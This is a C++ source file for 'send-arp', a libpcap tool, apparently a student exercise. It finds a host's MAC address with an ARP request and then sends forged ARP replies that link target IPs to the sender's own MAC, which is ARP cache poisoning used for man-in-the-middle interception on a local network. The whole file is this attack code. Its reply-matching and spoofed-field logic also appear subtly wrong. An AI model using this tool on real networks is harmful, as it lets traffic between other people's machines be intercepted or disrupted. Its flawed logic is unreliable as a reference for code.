#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"


#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Mac MyMac(const char* dev) {					//I using copilot to get my mac address function
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

Mac TaMac(pcap_t* pcap, const char* dev, Mac Mymac, Ip senderIp, Ip targetIp) {
	EthArpPacket packet;
	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.smac_ = Mymac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mymac;
	packet.arp_.sip_ = htonl(senderIp);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(targetIp);

	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcpa_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		}

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* reply;
		int res = pcap_next_ex(pcap, &header, &reply);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;

		EthArpPacket* recvPacket = (EthArpPacket*)reply;

		if (recvPacket->eth_.type_ != htons(EthHdr::Arp)) continue;

		if (recvPacket->arp_.op_ != htons(ArpHdr::Reply)) continue;
		if (recvPacket->arp_.sip_ != htonl(senderIp)) continue;
		if (recvPacket->arp_.tip_ != htonl(targetIp)) continue;

		return recvPacket->arp_.smac_;

	}
	fprintf(stderr, "error");
	exit(1);
}



int main(int argc, char* argv[]) {
	if (argc < 4 || ((argc - 2) % 2 != 0)) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	Mac myMac = MyMac(dev);
	

	for (int i = 2; i < argc; i += 2) {
		const char* senderIp = argv[i];
		const char* targetIp = argv[i + 1];
		
		Ip senderIP(senderIp);
		Ip targetIP(targetIp);

		EthArpPacket packet;
		Mac taMac = TaMac(pcap, dev, myMac, senderIP, targetIP);
		

		packet.eth_.dmac_ = taMac;
		packet.eth_.smac_ = myMac;
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::Size;
		packet.arp_.pln_ = Ip::Size;
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.arp_.smac_ = myMac;
		packet.arp_.sip_ = htonl(Ip(senderIp));
		packet.arp_.tmac_ = taMac;
		packet.arp_.tip_ = htonl(Ip(targetIp));

		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		}
	}
	pcap_close(pcap);
}
